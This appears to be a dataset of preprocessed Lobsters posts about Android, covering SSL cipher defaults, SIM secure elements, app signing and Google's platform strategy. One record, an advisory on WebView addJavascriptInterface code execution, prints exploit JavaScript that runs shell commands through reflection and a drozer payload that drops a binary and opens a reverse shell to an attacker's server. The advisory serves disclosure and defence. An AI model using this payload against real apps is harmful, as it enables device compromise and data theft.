digestalgorithms algorithm parameter null encapcontentinfo econtenttype econtent absent certificate dcertificate certinfo version serialnumber signature algorithm crls empty signerinfos version dissuerandserialnumber issuer cjp sttokyo cnkeystoretestca serialnumber digestalgorithm algorithm parameter null signedattrs object contenttype valueset object object signingtime valueset utctime oct gmt object messagedigest valueset octet string bd wv l bc cf bi los cb qdw e signaturealgorithm algorithm rsaencryption parameter null signature ce db ed unsignedattrs empty email encryption using nfc smart card implemented similar fashion time card required decrypting message summary practically nfcenabled android device used communicate contactless dualinterface smart card interface card application known fairly easy implement android component expose card functionality via custom interface even standard jce provider card cryptographic functionality used secure email provide http vpn authentication could especially useful dealing key generated card extracted pkcs backup file available importing file system credential store provide better user experience comparable security level device hardwarebacked credential store
553,Lobsters,android,Android,Google’s iron grip on Android: Controlling open source by any means necessary,http://arstechnica.com/gadgets/2013/10/googles-iron-grip-on-android-controlling-open-source-by-any-means-necessary/,google iron grip android controlling open source mean necessary,billion eu antitrust ruling google week iphone google search castle enlarge closed source creep search google launched voice action,light billion eu antitrust ruling google week started noticing certain classic ar story circulating around social medium google method controlling open source android code discouraging android fork exactly kind behavior eu problem many technique outlined article still use todaythe idea sequel piece come time google android strategy open source base paired key proprietary apps service nt really changed last five year update google proprietary apps look different screenshots article base strategy outlined still relevant light latest eu development resurfacing story weekend first ran october appears largely toss update anywhere felt particularly relevant six year ago november android open source project aosp announced original iphone came month earlier capturing people imagination ushering modern smartphone era google app partner original iphone could see future unchecked iphone competition would like vic gundotra recalling andy rubin initial pitch android stated argued google act faced draconian future future one man one company one device one carrier would choice google terrified apple would end ruling mobile space help fight iphone time google mobile foothold whatsoever android launched open source project era google nothing shred market welcome google decided give android away free use trojan horse google service thinking went google search one day locked iphone people would stop using google search desktop android moat around google search castle would exist protect google online property mobile world enlarge android rocketing market share today thing little different android went zero percent smartphone market owning nearly percent android arguably smartphone war android winning google winning necessarily thing since android open source nt really belong google anyone free take clone source create fork alternate version seen struggle window phone blackberry app selection everything mobile market android massive install base mean ton apps company fork android o already compatible million apps company need build app store get everything uploaded theory nongoogle o ton apps virtually overnight company google come way make android better would able build serious competitor possibly threaten google smartphone dominance biggest danger google current position successful alternative android distribution company taking swing separating google android successful highprofile alternative version android amazon kindle fire amazon take aosp skip usual google addons provides app store content store browser cloud storage email entire country china skip google part android google service banned option alternate version case google android code used get nothing easy give something away last place zero market share precisely android started first place though little harder open welcoming android gone thing protects google something worth protecting right mobile future internet controlling world largest mobile platform ton benefit point difficult stuff open source genie back bottle begs question control open source project google always given protection alternative version android many people think android actually fall two category open part android open source project aosp foundation android closed source part googlebranded apps google never go entire way completely close android company seems everything give leverage existing open source project company main method bring apps closed source google umbrella closed source creep always closed source google apps originally group consisted mostly client google online service like gmail map talk youtube android market share google comfortable keeping apps building rest android open source project since android become mobile powerhouse though google decided need control public source code apps might still aosp equivalent proprietary google version launched aosp version usually deprecated le open source code mean work google competitor ca nt kill open source app turn abandonware moving future development closed source app google rebrands app release new piece android onto play store often sign source closed aosp version dead search start search app excellent example happens google duplicate aosp functionality august google launched voice action company introduced google search android market day froyo picture show latest version aosp search google search running android see aosp search still stuck day froyo android google closed source app running immediately abandoned open source version google version search voice audio search texttospeech answer service contains google company predictive assistant feature aosp version web local search
554,Lobsters,android,Android,Why Android SSL was downgraded from AES256-SHA to RC4-MD5 in late 2010,http://op-co.de/blog/posts/android_ssl_downgrade/,android ssl downgraded late,tl dr horribly broken ssl connection preface secure authentication aprsdroid app speculation nsa decrypt xnyhps excellent post xmpp client whole series status quo analysis yaxim rfc significantly reduced security wait update tl ok combining two different variant apk source diving android source addition tl removal suspicious commit message possible reasoning added support elliptic curve addition hardcoded string list mi defined inventor java cipher order java runtime ciphersuite jsee cipherspec definition rfc added elliptic curve significantly improved cipher list conclusion wep beast appendix making app secure update serverside change best practice document ssllabs changing client cipher list browser cipher suite proposal bruce schneier scepticism ec cryptography warning beast use tl broken year ago attempt enforce tl use netcipher netcipher guardian project tor network orbot use androidpinning androidpinning moxie marlinspike use memorizingtrustmanager memorizingtrustmanager appendix b apps care android browser update webview update google chrome update firefox firefox browser android version fdroid enabling attack send app reading,tl dr android using combination horribly broken first default cipher ssl connection impact apps care enough change list enabled cipher ie almost existing apps post investigates default cipher replaced better cipher use prior android release december preface time ago adding secure authentication aprsdroid app amateur radio geolocation debugging tl handshake noticed leading client list supported cipher thus win negotiation task hand authentication secrecy care however following speculation nsa decrypt xnyhps excellent post xmpp client make sure read whole series brought focus seriously asked reason led status quo analysis first fired wireshark started yaxim android phone cyanogenmod galaxy nexus checked client hello packet sent indeed first followed quote rfc ciphersuite list passed client server client hello message contains combination cryptographic algorithm supported client order client preference favorite choice first thus server encouraged actually use explicitly forbidden configuration crammed legacy device crosschecked android cyanogenmod htc dream samsung original rom galaxy sii cyanogenmod galaxy android descbcsha edhrsadescbcsha edhdssdescbcsha expdescbcsha expedhrsadescbcsha expedhdssdescbcsha seen android came set cipher first followed android significantly reduced security removing putting broken prominent first place followed notsomuchbetter wait yes android version using starting also recently broken suddenly became favorite mac update tl ok combining two different variant android released late speculation nsa pouring money android developer sabotage u poor user arose immediately needed something wrote minimal test program apk source singlestepped find origin default cipher list turned android libcore package nativecryptogetdefaultciphersuites return hardcoded string array starting diving android source going back file change history revealed interesting thing like addition tl almost immediate removal suspicious commit message taking place android possible reasoning added support elliptic curve android finally addition hardcoded string list sometime android public static string getdefaultciphersuites int sslctx sslctxnew string supportedciphers sslctxgetciphers sslctx sslctxfree sslctx return supportedciphers return new string commit message tell u default cipher suite list chose match ri behavior priority based openssls default priority translated english used list openssl really good make list blackjack hooker test suite come another hint note added priority order defined ri documentation ri sure nothing mi stand reference implementation sun oracle java sdk version fine google engineer reduce security merely copy defined inventor java cipher order java runtime java reference implementation code responsible creating cipher list split two file first priorityordered set cipher constructed ciphersuite class definition ciphersuites enabled default listed preference order preferred first int p defaultsuitespriority add p krsa n add p krsa n enabled cipher sufficient priority added list ciphersuitelistgetdefault cipher list experienced relevant change since initial import java hg openjdk brought life going back time reveals even jdk first one incorporating jsee extension ssltls list le java java java sslrsawithnullshassldhersawithdescbcshassldhersawithdescbcsha tlsemptyrenegotiationinfoscsv original list resembles cipherspec definition rfc sorted numerically null cipher moved somewhere first release de deprecated tl added mix bringing aes pushed front make one wonder chage addition tlsemptyrenegotiationinfoscsv cipher information token server java added elliptic curve significantly improved cipher list android based jdk making effective default cipher list year old conclusion cipher order vast majority android device defined sun taken android project attempt improve compatibility considered problematic since remember wep broken change strong openssl cipher list hardcoded one starting weak cipher either sign horrible ignorance security incompetence clever disguise nsainfluenced manipulation decide beast made cipher tl le secure gained momentum notwithstanding time get rid application well android core call representative google board let know appendix making app secure app ever making contact server feel free choose best cipher fit cpu budget otherwise hard give generic advice app support wide variety different server without producing obscure connection error update serverside change cipher priority order defined client server option override server operator read excellent best practice document ssllabs resource server admins changing client cipher list client developer recycling wellmotivated browser cipher suite proposal written brian smith mozilla even though share bruce schneier scepticism ec cryptography following subset brian cipher supported android last three cipher named ssl instead tl warning beast ahead put place reused static final string enabledciphers get new socket factory sslsocket sslsocket sslcontextgetsocketfactory createsocket host port important set cipher list calling getsession starthandshake readingwriting socket ssetenabledciphersuites enabledciphers use tl default tl version used recent protocol version disabled server used broken contacted using approach seemed good conservative choice year ago least xmpp attempt enforce tl made follow app easily put place reused static final string enabledprotocols put right setenabledciphersuites ssetenabledprotocols enabledprotocols use netcipher netcipher android library made guardian project improve network security mobile apps come strongtrustmanager thorough certificate check independent root ca store code easily route traffic tor network using orbot use androidpinning androidpinning another android library written moxie marlinspike allow pinning server certificate improving security governmentscale mitm attack use app made communicate specific server use memorizingtrustmanager memorizingtrustmanager truly yet another android library allows app ask user want trust given selfsigneduntrusted certificate improving support regular connection private service writing xmpp client private cloud sync app use appendix b apps care android browser check default android browser revealed least android browser using default cipher list o participating regression browser come longer better stronger cipher list update surprisingly android webview class tested android also using better cipher update google chrome google chrome browser version serf following list one come good work google please go make default android runtime update firefox firefox browser android version fdroid come cipher suite well however contrary chrome missing gcm cipher mitigate beast attack seedsha favorite pick list enabling change cipher list beast mitigated attack might still bite send app android app significant user base better cipher list let know add list reading
555,Lobsters,android,Android,Nexus 5 almost totally revealed by leaked service manual,http://venturebeat.com/2013/10/06/nexus-5-almost-totally-revealed-by-leaked-service-manual/,nexus almost totally revealed leaked service manual,report android police recent nexus smartphone nexus moto x nexus longer available,rate many surprise google lg reveal finally announce nexus leaked service manual lgbuilt nexus confirms rumored specification screen quadcore snapdragon processor give u closest look yet device report android police nexus phone typically device meant lead way next wave android innovation also offer pure android experience without annoying thirdparty software last year though seen android phone quickly oneup recent nexus smartphone nexus heralded cheap offcontract price particular feature among spec manual show mostly expecting gigabyte ram megapixel camera optical image stabilization hefty mah battery nfc hoping camera significant step nexus disappointing shooter judging spec look like nexus offer anything truly innovative upgrade nexus powerful way get pure android experience consumer though moto x may better option thanks alwayson voice recognition capability google expected officially announce nexus within next week especially since nexus longer available google play store take look full leaked service manual
556,Lobsters,android,Android,Using the SIM card as a secure element in Android,http://nelenkov.blogspot.com/2013/09/using-sim-card-as-secure-element.html,using sim card secure element android,last post enhancement previously uicc sim card sim t simalliance sim card application decrypted java card card specification etsi t simalliance loader implement etsi t crack sim toolkit accessing sim card support stk security overview simalliance open mobile api seek android radio interface layer swp t proprietary extension assd usmile available emulator extension official wiki seenabled android application keymaster google authenticator google authenticator diy sim password manager mac hmac impossible documentation tutorial jca freely available bitcoin app problem weak design used default lowquality github summary michael,last post introduced one android notable security feature improved credential storage enhancement worth discussing post slightly change direction mentioned previously mobile device include form secure element se smart card based uicc usually called sim card almost universally present virtually sim card use today programmable thus used se continuing topic hardwarebacked security look sims programmed used enhance security android application sim card first word terminology correct term modern mobile device uicc universal integrated circuit card since goal post discus difference mobile network usually call sim card make distinction necessary sim card sim stand subscriber identity module refers smart card securely store subscriber identifier associated key used identify authenticate mobile network originally used gsm network standard later extended support lte since sims smart card conform standard regarding physical characteristic electrical interface originally size regular smart card fullsize ff far popular size nowadays minisim microsim nanosim introduced course every smart fit sim slot used mobile device next question make smart card sim card technically conformance mobile communication standard t certification simalliance practice ability run application allows communicate phone referred mobile equipment mobile station m related standard connect mobile network original gsm standard make distinction physical smart card software required connect mobile network introduction standard clear distinction made physical smart card referred universal integrated circuit card uicc different mobile network application run defined gsm csim usim isim etc uicc host run one network application hence universal thus used connect different network network application functionality depends specific mobile network core feature quite similar store network parameter securely identify network well authenticate user optionally store user data sim card application let take example briefly review network application work gsm main network parameter network identity international mobile subscriber identity imsi tied sim phone number msisdn used routing call changeable shared network authentication key ki connect network m need authenticate negotiate session key authentication session key derivation make use ki also known network looked imsi m sends connection request includes imsi network us find corresponding ki network us ki generate challenge rand expected challenge response sres session key kc sends rand m gsm application running sim card come play m pass rand sim card turn generates sres kc sres sent network match expected value encrypted communication established using session key kc see security protocol hinge solely secrecy ki since operation involving ki implemented inside sim never come direct contact neither m network scheme kept reasonably secure course security depends encryption algorithm used well major weakness allow intercepted gsm call decrypted using offthe shelf hardware found original version algorithm initially secret jumping back android moment implemented baseband software later network authentication never directly visible main o shown sim card need run application let say word application implemented installed initial smart card based file system model file elementary file ef directory dedicated file df named twobyte identifier thus developing application consisted mostly selecting id df host file called adf specifying format name efs store data example gsm application adf usim adf host efimsi efkeys efsms etc file practically sims used today based java card technology implement globalplatform card specification thus network application implemented java card applet emulate legacy filebased structure backward compatibility applet installed according globalplatform specification authenticating issuer security domain card manager issuing load install command one application management feature specific sim card support ota overtheair update via binary sm functionality used carry allows remotely install applet sim card issued ota implemented wrapping card command apdus sm tpdus forward sim etsi t sims actually way load applet card even initial personalization common globalplatformcompliant tool used managing sims one need either use tool support sim ota simalliance loader implement apdu wrappingunwrapping including necessary encryption integrity algorithm etsi t incidentally problem implementation secured packet sims use de encryption integrity algorithm used crack ota update key major use ota functionality install maintain sim toolkit stk application interact handset via standard proactive reality implemented via polling command display menu even open web page send sm stk application almost unheard u asia still heavily used part europe africa anything mobile banking citizen authentication android also support stk dedicated stk system app automatically disabled sim card stk applet installed accessing sim card mentioned network related functionality implemented baseband software done android entirely dependent feature baseband expose android support stk application internal support communicating sim o security overview explicitly state low level access sim card available thirdparty apps use se android build major vendor notably samsung provide implementation simalliance open mobile api handset open source implementation compatible device available seek android project open mobile api aim provide unified interface accessing s android including sim understand open mobile api work cause limitation let first review access sim card implemented android android device mobile network functionality dialing sending sm etc provided baseband processor also referred modem radio android application system service communicate baseband indirectly via radio interface layer ril daemon rild turn talk actual hardware using manufacturerprovided ril hal library wrap proprietary interface baseband provides sim card typically connected baseband processor sometimes also nfc controller via swp thus communication need go ril proprietary ril implementation always access sim order perform network identification authentication well readwrite contact access stk application support transparent apdu exchange always available standard way provide feature use extended command atcsim generic sim access atcgla generic uicc logical channel access defined t vendor implement using proprietary extension support necessary command automatically provide sim access seek android provides patch implement resource manager service smartcardservice connect supported se embedded se assd uicc extension android telephony framework allow transparent apdu exchange sim mentioned access ril hardware proprietary ril library dependent need compatible device build includes smartcardservice related framework extension thanks work usmile project uicc access variant popular galaxy handset available using patched cyanogenmod build make use latest seek version even nt one device use seek emulator extension let use standard pcsc smart card reader connect sim android emulator note regular java card wo nt work box emulator look gsm application mark card usable nt find one modify skip step simple solution install dummy gsm application always return expected response managed get device emulator talk sim using openmobile api send command quite straightforward connect se service asynchronous seservice seservice new seservice list reader reader reader seservicegetreaders assume first one sim open session session session reader opensession open logical basic channel channel channel sessionopenlogicalchannel aid send apdu get response byte rapdu channeltransmit cmd need request orgsimallianceopenmobileapismartcard permission add orgsimallianceopenmobileapi extension library manifest work see official wiki detail manifest usespermission android name orgsimallianceopenmobileapismartcard application useslibrary android name orgsimallianceopenmobileapi android required true application manifest seenabled android application connect sim card application use regular smart card se used store data key securely perform cryptographic operation without key leave card one usual application smart card store rsa authentication key certificate used anything desktop logon vpn ssl authentication typically implemented providing sort middleware library usually standard cryptographic service provider csp module plug system csp loaded compatible application android security model allow system extension provided third party apps order integrate system key management service middleware would need implemented keymaster module system credential store keystore bundled system library accomplished building custom rom installs custom keymaster module also take advantage se without rebuilding whole system straightforward way implement security critical part app inside se app act client provides userfacing gui one application provided seek distribution sebacked onetime password otp google authenticator app since critical part otp generator seed usually symmetric cryptographic key easily cloned seed obtained extracted thus otp apps store seed regular file like official google authenticator app provide little protection device o compromised seek googleotpauthenticator app store seed performs otp generation inside se making impossible recover seed app data stored device another type popular application could benefit using se password manager password manager typically use usersupplied passphrase derive symmetric key turn used encrypt stored password make hard recover stored password without knowing passphrase naturally security level totally dependent complexity usual typing long string rarely used character mobile device particularly pleasant experience user tend pick easier type lowentropy passphrases key stored se passphrase skipped replaced simpler pin making password manager app userfriendly secure let see sebacked password manager implemented using java card applet open mobile api diy sim password manager ideally key management encryption logic implemented inside se client application would provide input plain text password retrieve opaque encrypted data se applet provide encryption also guarantee integrity encrypted data either using algorithm provides authenticated encryption smart card nt natively support currently calculating mac encrypted data using hmac similar mechanism smart card typically provide sort encryption support starting lowend model going rsa ec topoftheline one since public key cryptography typically needed mobile network authentication secure ota based symmetric algorithm sim card rarely support rsa ec reasonably secure symmetric hash algorithm enough implement simple password manager though theory able use even lowerend sim mentioned previous section recent sim card based java card technology possible develop load custom applet provided one access card manager ota key naturally available commercial mno sims would need use blank programmable sim allows loading applet without authentication come bundled required key quite hard impossible come let see password manager applet could implemented wo nt discus basic java card programming jump straight implementation refer offical documentation tutorial need introduction java card api provides subset jca class interface optimized towards using preallocated shared byte array typical memory constrained platform smart card basic encryption example would look something like byte buff apdugetbuffer deskey deskey deskey keybuilderbuildkey keybuildertypedestransientdeselect false deskeysetkey keybytes short cipher cipher ciphergetinstance false cipherinit deskey ciphermodeencrypt cipherdofinal data short short datalength buff short see dedicated key object automatically cleared applet deselected first created used initialize cipher instance besides unwieldy number cast short necessary classic java card support int still default integer type code similar would find java se android application hashing us messagedigest class follows similar routine using systemprovided cipher messagedigest class building block fairly straightforward implement cbc mode encryption hmac data integrity however happens low end sim card provide usable implementation class even though spec sheet claim would need start scratch fortunately since java card execute arbitrary program long fit memory also possible include encryption algorithm implementation applet even better java card optimized aes implementation freely available implementation provides basic piece aes key schedule generation single block encryption additional work required match java cipher class functionality bigger downside using algorithm implemented software take advantage specialized crypto coprocessor smart card implementation sim cpu ram card take second process single aes block key performance improved slightly reducing number aes round recommended key lower security level system result nonstandard cipher making testing difficult another disadvantage native key object usually stored secured memory area better protected side channel attack using cipher forced store key regular byte array caveat aes implementation give u need demo application using javacardaes class building block aes cbc encryption routine would look something like aescipherroundkeysschedule keybytes short roundkeysbuff short padsize addpadding cipherbuff offset len short paddedlen short len padsize short block short paddedlen aesblocklen short block short cipheroffset short aesblocklen short j j aesblocklen j cbcv j cipherbuff short cipheroffset j aescipheraesencryptblock cbcv offsetzero roundkeysbuff utilarraycopynonatomic cbcv offsetzero cipherbuff cipheroffset aesblocklen concise using system crypto class get job done finally shown iv cipher text copied apdu buffer sent back caller decryption follows similar pattern one thing obviously missing mac turn hash algorithm implemented software prohibitively slow sim mostly need access large table stored slow card eeprom mac also implemented using aes primitive omitted sample applet practice tampering cipher text encrypted password would result incorrect password still good idea use mac implementing fully functional java card applet perform encryption decryption one critical piece still missing random number generator java card api randomdata class typically used generate key material iv cryptographic operation cipher class available sim therefore unfortunately need apply diy approach keep thing simple somewhat reasonable response time implement simple pseudo random number generator prng based aes counter mode mentioned largest integer type classic java card short counter wrap soon go overcome fairly easily using persistent byte array simulate long biginteger ambitious bigger problem suitable source entropy smart card use seed prng therefore prng aes key nonce need specified applet install time unique sim simplistic prng implementation based javacardaes class shown buff output buffer utilarraycopynonatomic prngnonce offsetzero cipherbuff offsetzero short prngnoncelength utilsetshort cipherbuff short aesblocklen prngcounter aescipherroundkeysschedule prngkey short roundkeysbuff aecipheraesencryptblock cipherbuff offsetzero roundkeysbuff prngcounter utilarraycopynonatomic cipherbuff offsetzero buff offset len recent bitcoin app problem traced repeatable prng android controversy around dualecdrbg prng algorithm believed weak design used default popular crypto toolkits finally lowquality hardware rng found fips certified smart card highlighted critical impact flawed prng system us cryptography diy prng definitely something would like use production system find sim provides working crypto class use randomdataalgsecurerandom initialize prng wo nt help much card hardware rng flawed course piece needed implement password manager applet left define expose public interface java card mean defining value cla in byte applet process besides obviously required encrypt decrypt command also provide command get current state initialize clear applet static final byte cla byte static final byte insgetstatus byte static final byte insgenrandom byte static final byte insgenkey byte static final byte insencrypt byte static final byte insdecrypt byte static final byte insclear byte working applet implementing android client fairly straightforward need connect seservice open logical channel applet aid send appropriate apdus using protocol outlined example sending string encrypted requires following code assuming already open session se standard iso success status word sw channel channel sessionopenlogicalchannel fromhex byte data password getbytes ascii string cmdstr stringformat datalength tohex data byte rapdu channeltransmit fromhex cmdstr short sw short rapdu rapdulength rapdu rapdulength sw short handle error byte ciphertext arrayscopyof rapdu rapdulength string encrypted ciphertext besides calling applet operation sending command se sample android app also simple database store encrypted password paired description display currently managed password list view long pressing password name bring contextual action allows decrypt temporarily display password copy paste target application current implementation require pin decrypt password one easily provided using java card ownerpin class optionally disabling applet number incorrect try reached app hardly compete popular password manager enough functionality illustrate concept sebacked app practially useful password added pressing action item delete item clear encryption key prng counter prng seed nonce screenshot awardwinning ui shown full source code applet android app available github summary aosp version android provide standard api use sim card se many vendor long device baseband ril support apdu exchange one added using seek android patch allows improve security android apps using sim secure element store sensitive data implement critical functionality inside commercial sim allow installing arbitrary user application applet automatically loaded carrier using sim ota mechanism apps take advantage applet distributed regular channel play store thanks michael developing galaxy ril patch helping getting work somewhat exotic
557,Lobsters,android,Android,WebView addJavascriptInterface Remote Code Execution,https://labs.mwrinfosecurity.com/blog/2013/09/24/webview-addjavascriptinterface-remote-code-execution/,webview addjavascriptinterface remote code execution,advisory webview adventure android webviews shouldoverrideurlloading androidwebkitjavascriptinterface abusing webview javascript bridge static analysis dalvik bytecode reflection android javalangruntime appbrain ad network sdk,recently researching vulnerability within cross platform mobile application development framework whilst performing research identified number issue advisory detail one serious issue affect current android platform device issue allows attacker execute arbitrary code android device vulnerability exploited injecting javascript webview released output related research previously see previous post adventure android webviews background informationlately analysing mobile advertising network particular software development kit sdk network make available application developer purpose monetising application research found lot application expose mobile device user threat compromise found number exploitable cross platform vulnerability expect find research continues early stage research conducting research area however decided release advisory help android user take appropriate action protect themselvesmany advertising network make sdk available application developer ease integration sdk contains header file static library header file contain function declaration imported project function called library file contains actual executable code work linked linker provide actual functionality definition rather declaration advertising network require application display content within webkit webview webkit open source web browser engine power browser google chrome apple safari default io android browser etc webview core view class webkit frameworkmany free apps use webview load html content inprocess web browser advertising network sdk us browser instance facilitate advertisement loading remote advertiser network advertisement loaded clear text channel http susceptible man middle mitm attack attacker able mitm communication advertising network inject arbitrary javascript webviewadvertising network gather metric tailor campaign target specific audience advertiser pay lot money accurate metric andor successful delivery targeted advertisement advertising network also want leverage mobile device platform deliver rich medium advertisement achieve goal access platformdevices native capability often required realised implementing native bridge possible call native code rendered webview using javascript achieved android platform two different way first use public method shouldoverrideurlloading see android developer site detail method example implementation override public boolean shouldoverrideurlloading webview view string url urlsubstring equalsignorecase yourscheme parse url object execute function call java initiated java script passing parameter within url windowlocation yourscheme method parametervaluethe second method available android platform use androidwebkitjavascriptinterface interface see android developer site detail interface example implementation public class webviewgui extends activity webview mwebview public void oncreate bundle savedinstancestate superoncreate savedinstancestate mwebviewnew webview mwebviewgetsettings setjavascriptenabled true mwebviewaddjavascriptinterface new javascriptinterface jsinterface mwebviewloadurl file androidassetwwwindexhtml setcontentview mwebview final class javascriptinterface javascriptinterface public string getsomestring return string call java initiated java script var string windowjsinterfacegetsomestring webview javascript bridge abused execute arbitrary java code using reflection acquire reference runtime object via interface implemented java code note javascriptinterface named anything jsinterface chosen illustration purpose onlythe issue disclosed publicly article authored neil titled abusing webview javascript bridge december issue alluded paper titled static analysis dalvik bytecode reflection android authored erik ramsgaard wognsen henrik søndberg karlsen however found reference discussion regard active exploitation online prior presenting issue related research september conference september posted online detailing issue used send smsthe following javascript injected webview implement native bridge using androidwebkitjavascriptinterface interface result execution operating system command via javalangruntime script function execute cmd return windowjsinterfacegetclass forname javalangruntime getmethod getruntime null invoke null null exec cmd execute systembinsh c echo mwr mntsdcardmwrtxt script go even use vector drop drozer payload much feature rich exploitation experience drozer android security assessment framework think metasploit android found weasel binary aid loading running drozer agent code execution gained android device think meterpreter android use drozer generate weasel payload drozer payload list shellreversetcparmeabi establish reverse tcp shell armeabi weaselreversetcparmeabi weasel reverse tcp shell armeabi weaselshellarmeabi deploy weasel set shell command armeabi drozer payload build weaselshellarmeabi grep echo awk f gsub print execute echo e give one liner embed javascript payload execute systembinsh c echo e path payload going inject binary stripped readability cat drozerjs var host var port var path datadatacomvulnappfilesweasel function execute cmd return windowinterfacegetclass forname javalangruntime getmethod getruntime null invoke null null exec cmd execute systembinrm path execute systembinsh c echo e path execute systembinchmod path execute path host port payload injected webview write execute weasel payload command start drozer server seen payload executed connected back drozer server drozer server start starting drozer server listening drozerserverprotocolshttp info get agentjar drozerserverprotocolshttp info get agentapk drozerserverprotocolsdrozerpdroidhg info accepted connection drozerserverprotocolsshell info accepted shell command list connected remote device drozer console device list bound device device id manufacturer model software unknown unknown unknown command used connect listening console drozer console connect r nd ro idsnemesisand pr otectorandroidsneme sisandprotectorandroids nemesisandprotectorandroidsn emesisandprotectorandroidsnemes isandp rotectorandro idsnem isisandp rotectorandroid snemisis andprotectorandroidsnemisisandprotec torandroidsnemesisandprotectorandroid snemisisandprotectorandroidsnemesisan dprotectorandroidsnemesisandprotector drozer console dz point attacker able perform number attack device using drozer lowest impact attack would downloading content sd card exploited application data directory however depending device exploited could extend obtaining root privilege retrieving sensitive user data device causing user monetary loss analysed large number advertising network sdk found lot implement bridge vulnerable exploitation advertising network sdk obtained advertising network directly found vulnerable recent version however lot application google play store found using old version sdk vulnerablenote linked sdk built api lower vulnerability exists even application using sdk built api issue exploitable device version androidthe command used identify presence javascriptinterface decompiling app inspecting grep r n include java addjavascriptinterface command used indicate code built api includes javascriptinterface annotation grep r include java javascriptinterface note package decompiled using jdgui order ensure annotation includedon july mwr downloaded top android application google play store analysed application apps profiled number apps use ad monetisation strategy due popular subscription service like netflix free service funded way ebay mean top free apps adfree remaining application discovered many used multiple advertising library framework use result presented number ad network identified admob google inmobi mdotm admarvel flurry tapjoy millenial medium medialets greystipe adwhirl freewheel number ad framework identified mopub burstly mobclix mocean application examined determine many vulnerable issue apk application downloaded decompiled source searched use addjavascriptinterface searched presence javascriptinterface annotation package linked ad sdk contained annotation dismissedthe finding indicated apps potentially vulnerable interface implemented within ad network interface present webviews load content remotely clear text channel investigate every packagea script crafted automatically download android application decompile identify ad network use determine vulnerable top application found vulnerableaccording appbrain free apps paid apps apps total appbrain website discovering android apps appbrain also includes stats number apps integrate ad network sdk apps google play store clearly illustrates many application potential target attack page list ad networksad framework unfeasible u analyse every sdk determine exploitability previously stated even latest sdk available vulnerable may well apps market place upgraded sdk vulnerable version therefore vulnerable
559,Lobsters,android,Android,PSA: Think About Stronger App Signing Keys,http://commonsware.com/blog/2013/09/09/psa-think-about-stronger-app-signing-keys.html,psa think stronger app signing key,psa think stronger app signing key documentation app signing one survey found android apps use signing key creating apps security paramount guardian project,psa think stronger app signing key back beginning android development told use keytool generate production signing key apks real requirement key long enough validity period year time iirc documentation app signing contains small side note keysize parameter keytool size generated key bit supplied keytool us default key size bit general recommend using key size bit higher reason key size recommendation rsa keytool default considered risk year recent revelation statesponsored decryption research hammering home even today forging digital signature still impractical largest security agency well within reason fall within reach large botnets nottoodistant future security issue earlier apps able replaced hacked edition without tripping signature check signaturelevel permission check might start passing due forged signature switching larger keysize new apps specify keysize creating production signing key good long time barring major decryption breakthrough rsa signature existing apps existing signing key though change key without breaking ability update app security measure trying ensure work stop u unfortunately one survey found android apps use signing key includes created production signing key documentation update missed update since security point trumpted google hence bit trumpeting fortunately without trumpet play trumpet bit early morning neighbor put amateur create new stronger production signing key separate key whatever using production make note use new signing key new apps create reason migrating existing user base new app eg free app offering paidapp option consider using new signing key consultant create unique signing key per project cut using stronger key new client project creating apps security paramount might consider whether worthwhile move user base new version app new signing key point tip hat guardian project whose mailing list post pointed issue interested jetpack compose jetcdev weekly newsletter latest article sample detail compose development sep
560,Lobsters,android,Android,Android KitKat unveiled in Google surprise move,http://www.bbc.co.uk/news/technology-23926938,android kitkat unveiled google surprise move,brand software recently bag dog food continue reading main story analysis android attracts malware attack recorded,september last updated leo kelion technology reporter nestle plan sell million chocolate bar featuring android mascot google calling next version mobile operating system android kitkat news come surprise firm previously indicated version o would key lime pie decision brand software name nestle chocolate bar likely seen marketing coup swiss food beverage maker however google told bbc come idea neither side paying moneychanginghands kind deal john lagerling director android global partnership told bbc instead said idea something fun unexpected however one branding expert warned potential pitfall deal brand hooked another inevitably become associated brand good ill said simon myers partner consultancy prophet brand business reputational issue emerge would naive think brand owner good name brand equity would affected nestle faced criticism past way promoted powdered baby milk developing world also recall numerous product recently bag dog food following salmonella scare u continue reading main story analysis allyson stewartallen director international marketing partner androidkitkat brand marriage creative possibly clever idea many consumer market around world know kitkat bar generally positive association name risk however one two brand recall scandal taint example kellogg dropped olympic swimmer michael phelps picture smoking marijuana published press study later suggested firm reputation suffered consequence google also attracted controversy including recent report u government suggesting android attracts malware attack mobile o google also announced recorded system activated smartphone device one billion time cold call since google partner open handset alliance codenamed android release type treat major update progressing letter along alphabet previous version called cupcake donut eclair froyo short frozen yoghurt gingerbread honeycomb ice cream sandwich jelly bean although developer referred forthcoming version klp internal document mr lagerling said team decided late last year opt instead chocolate bar realised people actually know taste key lime pie explained one snack keep kitchen latenight coding kitkats someone said hey nt call release kitkat nt even know company controlled name thought choice would difficult thought well decided reach nestle folk mr lagerling said made cold call switchboard nestle uk advertising agency end november propose tieup google installed statue android mascot made kitkats headquarters next day swiss firm invited take part conference call nestle confirmed deal hour later frankly decided within hour say let patrice bula nestle marketing chief told bbc mr bula acknowledges risk involved example new o proved crashprone particularly vulnerable malware could cause collateral damage kitkat brand maybe fired joked try lead new way communicating profiling brand always higher risk something much traditional go round swimming pool time wondering water cold hot say let jump secret story executive two firm met face face secret event held mobile world congress barcelona february finalise detail promote alliance nestle plan deliver million chocolate bar featuring android mascot shop market including uk u brazil india japan russia packaging produced advance past two month despite scale operation two firm managed keep story secret keeping confidential paramount google strategy acknowledges mr bula absolutely nothing leaked google previously used generic name sweet treat rather specific brand android team also took step preserve element surprise notifying tight team decision kept calling name key lime pie internally even referred partner revealed mr lagerling said k release way secret people would racked mind trying work going google employee learned news statue android mascot made kitkats unveiled firm mountain view california campus lot thing especially tech nowadays become public officially supposed said mr lagerling think going big surprise lot people including googlers
561,Lobsters,android,Android,Google is defragging Android,http://arstechnica.com/gadgets/2013/09/balky-carriers-and-slow-oems-step-aside-google-is-defragging-android/,google defragging android,headline feature google io enlarge enlarge looked shortly google io shim current android statistic google announced slew new apis google play store account,ron amadeo android released nexus device little month ago usual android update taking much longer roll general public right little six percent android user latest version pay attention various android forum may noticed something one care headline feature new camera ui restricted user profile support new version bluetooth opengl e camera extremely dull lowlevel enhancement google idea android team slowing google purposefully made every effort make android o update boring possible make boring update getting samsung oems actually update device latest version android extremely difficult time oems get new version port skin ship build carrier carrier finally push ota update many month pas device nt popular enough process nt happen updating phone massive project involving several company none seem committed process much hurry get done since really hard push android update google solution sidestep process completely company stopped putting good stuff android update good stuff nt coming exciting feature included part big android release year google io show force new delivery concept new android version show yet google announced google hangout google play game cloud saving game app data complete redesign google play music google map new version google map api new location activity recognition apis post io seen seemingly oslevel feature added like android device manager remote wipe device tracking system without needing touch base o simple idea android update roll slowly start 